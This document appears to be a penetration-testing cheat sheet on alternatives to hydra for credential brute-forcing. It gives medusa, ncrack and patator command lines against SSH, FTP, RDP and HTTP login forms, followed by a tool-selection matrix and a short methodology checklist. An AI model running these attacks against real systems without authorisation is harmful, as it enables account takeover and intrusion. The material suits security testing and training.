# Alternative Brute Force Tools

> Covers: medusa, ncrack, patator, xhydra

## Why Alternatives Exist
Hydra is the standard, but each tool has strengths for specific scenarios.

---

## medusa — Parallel Brute Forcer

### When to Choose Over Hydra
| Scenario | Tool |
|---|---|
| Modular protocol support needed | medusa |
| Need thread-per-host control | medusa |
| Hydra failing on specific service | try medusa |

### Common Invocations
```bash
# SSH brute
medusa -h <target> -u <user> -P <wordlist> -M ssh

# FTP brute
medusa -h <target> -u <user> -P <wordlist> -M ftp

# HTTP form
medusa -h <target> -u <user> -P <wordlist> -M web-form -m FORM:"login.php" -m FORM-DATA:"user=&pass=" -m DENY-SIGNAL:"failed"

# Multiple hosts
medusa -H hosts.txt -u admin -P <wordlist> -M ssh

# With threads
medusa -h <target> -u <user> -P <wordlist> -M ssh -t 4
```

---

## ncrack — High-Speed Network Auth Cracker

### When to Choose
| Scenario | Tool |
|---|---|
| RDP brute force | ncrack (better RDP support) |
| Need timing profiles | ncrack has built-in timing |
| Nmap-like syntax preferred | ncrack feels familiar |

### Common Invocations
```bash
# RDP brute
ncrack -u <user> -P <wordlist> rdp://<target>

# SSH brute
ncrack -u <user> -P <wordlist> ssh://<target>

# With timing (0-5, like nmap)
ncrack -u <user> -P <wordlist> -T 3 ssh://<target>

# Multiple services
ncrack -u <user> -P <wordlist> ssh://<target> ftp://<target>
```

---

## patator — Multi-purpose Brute Forcer

### When to Choose
| Scenario | Tool |
|---|---|
| Complex attack patterns | patator is most flexible |
| Need custom filtering | Advanced response matching |
| Need module chaining | patator supports it |

### Common Invocations
```bash
# SSH brute
patator ssh_login host=<target> user=<user> password=FILE0 0=<wordlist>

# FTP brute
patator ftp_login host=<target> user=<user> password=FILE0 0=<wordlist>

# HTTP form brute
patator http_fuzz url="http://<target>/login" method=POST body="user=admin&pass=FILE0" 0=<wordlist> -x ignore:fgrep='Login failed'
```

---

## xhydra — Hydra GUI

Just hydra with a graphical interface. Use when:
- Prefer visual configuration
- Setting up complex HTTP form attacks
- Teaching/demonstrating

---

## Decision Matrix

```
DEFAULT CHOICE:         hydra (most documented, widest support)
RDP BRUTE:              ncrack (better RDP handling)
COMPLEX PATTERNS:       patator (most flexible)
PARALLEL MULTI-HOST:    medusa (better host-threading)
HYDRA FAILS:            try medusa → ncrack → patator
```

## Same Rules Apply

All brute force tools share the same pre-conditions as hydra:
1. Enumerate users first
2. Try default creds first
3. Check for bypass (SQLi, etc.)
4. Check lockout policy
5. Use targeted wordlists
6. LAST RESORT
